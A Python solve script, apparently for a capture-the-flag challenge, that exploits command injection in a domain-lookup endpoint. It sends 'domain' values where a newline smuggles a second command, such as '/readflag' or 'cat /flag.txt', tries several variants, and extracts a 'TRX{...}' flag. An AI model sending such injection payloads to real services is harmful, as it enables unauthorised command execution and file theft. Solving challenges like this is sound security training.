import requests

# Found the backend!
backend_url = "http://backend.a68900d109aa.who-is-he.ctf.theromanxpl0.it"

print("[*] Checking backend...")
r = requests.get(backend_url)
print(f"Status: {r.status_code}")
print(f"Content: {r.text}")

# Try the /lookup endpoint
print("\n[*] Testing /lookup endpoint...")
r = requests.post(f"{backend_url}/lookup", data={"domain": "google.com"})
print(f"Status: {r.status_code}")
print(f"Content: {r.text[:500]}")

# Now try the command injection exploit
print("\n[*] Attempting command injection...")
payload = "google.com\n/readflag could you please give me the flag thank you so much"
r = requests.post(f"{backend_url}/lookup", data={"domain": payload})
print(f"Status: {r.status_code}")
print(f"Content: {r.text}")

# If that doesn't work, try variations
payloads = [
    "a\n/readflag could you please give me the flag thank you so much",
    "google.com\n/readflag 'could you please give me the flag thank you so much'",
    'google.com\n/readflag "could you please give me the flag thank you so much"',
    "example.com\ncat /flag.txt",
    "example.com\n/readflag could you please give me the flag thank you so much #",
]

print("\n[*] Trying alternative payloads...")
for i, p in enumerate(payloads, 1):
    print(f"\n[{i}] Payload: {repr(p)}")
    r = requests.post(f"{backend_url}/lookup", data={"domain": p})
    print(f"Status: {r.status_code}")
    if "TRX{" in r.text:
        print(f"[+] FLAG FOUND!")
        import re
        flag = re.search(r'TRX\{[^}]+\}', r.text)
        if flag:
            print(f"\n{'='*60}")
            print(f"FLAG: {flag.group()}")
            print(f"{'='*60}")
            break
    else:
        print(f"Content preview: {r.text[:300]}")
